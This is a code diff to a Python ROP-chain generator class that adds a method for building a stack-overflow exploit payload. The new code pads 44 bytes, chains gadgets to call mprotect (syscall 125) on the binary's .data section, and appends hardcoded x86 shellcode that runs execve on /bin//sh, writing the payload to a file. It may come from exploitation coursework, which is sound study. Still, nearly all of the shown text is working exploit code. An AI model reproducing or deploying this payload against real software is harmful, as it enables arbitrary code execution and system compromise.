@@ -210,7 +210,7 @@ class ROPMakerX86(object):
                 locationForNULL = stack - (4 - lastWord.index(b'\x07'))         # Write a NULL at the end of the argument
 
             p += pack('<I', popDst["vaddr"]) 
-            p += pack('<I', locationForNULL)    #
+            p += pack('<I', locationForNULL)
             p += self.__custompadding(popDst, {})
 
             p += pack('<I', xorSrc["vaddr"]) 
@@ -257,7 +257,6 @@ class ROPMakerX86(object):
 
         #adding null
 
-
         p += pack('<I', popEbx["vaddr"]) 
         p += pack('<I', dataAddr) 
         p += self.__custompadding(popEbx, {})
@@ -292,6 +291,86 @@ class ROPMakerX86(object):
         outputfile = open("paddingbruteforce", "wb")
         outputfile.write(p)
         outputfile.close()
+
+
+    def arbitrary_shell_code(self, write4where, popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall):
+
+        sects = self.__binary.getDataSections()
+        dataAddr = None
+        for s in sects:
+            if s["name"] == ".data":
+                dataAddr = s["vaddr"] + self.__liboffset
+        if dataAddr is None:
+            print("\n[-] Error - Can't find a writable section")
+            return
+
+        #p = b'A' * self.padding
+        p = b'\x41' * 44
+        #p += b'BBBB'
+        
+        stack = dataAddr
+        print("STACK ADDRESS IS: {0:8x} ".format(stack))
+
+        ###############
+
+        loc_of_shellcode = stack + (4*(11 + 2*125 + 1))
+
+        # puts start address in to ebx 
+        
+        p += pack('<I', popEbx["vaddr"]) 
+        p += pack('<I', loc_of_shellcode)       # start address of the 
+        p += self.__custompadding(popEbx, {})
+
+        #puts stack in to ebx (program)
+
+        p += pack('<I', popEcx["vaddr"]) 
+        p += pack('<I', 0x00000030)#48)#popEcx["vaddr"]) 
+        print("CHECK FINAL:", p)
+        p += self.__custompadding(popEcx, {"ebx": loc_of_shellcode})  
+
+        #puts stack + 60 in to ecx (args)
+
+        p += pack('<I', popEdx["vaddr"]) 
+        p += pack('<I', 0x00000004)#4) 
+        p += self.__custompadding(popEdx, {"ebx": loc_of_shellcode, "ecx": 0x00000030})  
+
+        #puts stack in to edx (env)
+
+        p += pack('<I', xorEax["vaddr"]) 
+        p += self.__custompadding(xorEax, {"ebx": loc_of_shellcode, "ecx": 0x00000030})  
+
+        for _ in range(125):
+            p += pack('<I', incEax["vaddr"]) 
+            p += self.__custompadding(incEax, {"ebx": loc_of_shellcode, "ecx": 0x00000030})  # Don't overwrite ebx and ecx
+
+        #sets eax to 125
+
+        p += pack('<I', syscall["vaddr"]) 
+
+        # Call syscall
+
+        p += pack('<I', 0x31c05068) 
+        p += pack('<I', 0x2f2f7368)
+
+        p += pack('<I', 0x682f6269)
+        p += pack('<I', 0x6e89e350)
+
+        p += pack('<I', 0x5389e199)
+        p += pack('<I', 0xb00bcd80)
+
+        # 31 c0 50 68
+        # 2f 2f 73 68
+        # 68 2f 62 69
+        # 6e 89 e3 50
+        # 53 89 e1 99
+        # b0 0b cd 80
+
+        #print("ROP CHAIN:", p)
+
+        file = open("shellcode_ROP", "wb")
+        file.write(p)
+        file.close()
+
 
     def __generate(self):
 
@@ -368,38 +447,6 @@ class ROPMakerX86(object):
         print("\n- Step 5 -- Build the ROP chain\n")
 
         self.__buildRopChain(write4where[0], popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall)
-        self.customRopChain(write4where[0], popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall)
+        #self.customRopChain(write4where[0], popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall)
+        self.arbitrary_shell_code(write4where[0], popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall)
     
-
-    def arbitrary_shell_code(self, write4where, popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall):
-
-        
-
-        p += pack('<I', popEbx["vaddr"]) 
-        p += pack('<I', dataAddr) 
-        p += self.__custompadding(popEbx, {})
-
-        #puts stack in to ebx (program)
-
-        p += pack('<I', popEcx["vaddr"]) 
-        p += pack('<I', safestack) 
-        p += self.__custompadding(popEcx, {"ebx": dataAddr})  
-
-        #puts stack + 60 in to ecx (args)
-
-        p += pack('<I', popEdx["vaddr"]) 
-        p += pack('<I', stack) 
-        p += self.__custompadding(popEdx, {"ebx": dataAddr, "ecx": safestack})  
-
-        #puts stack in to edx (env)
-
-        p += pack('<I', xorEax["vaddr"]) 
-        p += self.__custompadding(xorEax, {"ebx": dataAddr, "ecx": safestack})  
-
-        for _ in range(125):
-            p += pack('<I', incEax["vaddr"]) 
-            p += self.__custompadding(incEax, {"ebx": dataAddr, "ecx": safestack})  # Don't overwrite ebx and ecx
-
-        #sets eax to 125
-
-        p += pack('<I', syscall["vaddr"]) 
